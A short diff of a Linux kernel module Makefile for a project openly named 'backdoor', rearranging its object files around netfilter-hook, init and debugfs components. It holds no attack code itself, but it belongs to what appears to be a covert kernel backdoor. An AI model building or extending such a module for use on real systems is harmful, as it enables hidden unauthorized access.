@@ -2,10 +2,8 @@ BACKDOOR := backdoor
 
 obj-m := $(BACKDOOR).o
 $(BACKDOOR)-y += init.o
-$(BACKDOOR)-y += request.o
-$(BACKDOOR)-y += net.o
+$(BACKDOOR)-y += nfhook.o
 $(BACKDOOR)-y += debugfs.o
-$(BACKDOOR)-y += nfhooks.o
 
 default: all
 
